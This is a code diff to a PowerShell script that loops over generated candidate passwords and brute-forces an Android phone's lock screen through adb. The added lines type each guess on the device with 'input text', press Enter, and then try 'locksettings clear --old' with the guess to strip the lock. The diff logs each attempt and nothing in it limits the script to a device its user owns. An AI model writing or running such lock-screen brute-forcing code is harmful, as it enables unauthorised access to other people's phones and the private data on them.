@@ -23,6 +23,18 @@ for ($randomPart1 = 9; $randomPart1 -ge 0; $randomPart1--) {
         $logMessage = "Trying password: $password"
         $logMessage | Out-File -Append -FilePath $logFilePath
 
+        # Use adb to simulate text input (simulate typing the password on the screen)
+        # First, clear any previous text on the screen to ensure fresh input
+        & "C:\Users\r\Downloads\platform-tools\adb.exe" shell input keyevent 66  # Simulate 'Enter' key to clear previous text
+        Start-Sleep -Seconds 1  # Add a short pause between actions
+
+        # Simulate typing the password
+        & "C:\Users\r\Downloads\platform-tools\adb.exe" shell input text "$password"
+        Start-Sleep -Seconds 1  # Wait for the input to be completed
+        
+        # Simulate pressing the Enter key after typing the password (if required)
+        & "C:\Users\r\Downloads\platform-tools\adb.exe" shell input keyevent 66  # 'Enter' key
+
         # Use adb to clear the lock settings
         $command = & "C:\Users\r\Downloads\platform-tools\adb.exe" shell locksettings clear --old $password 2>&1
 
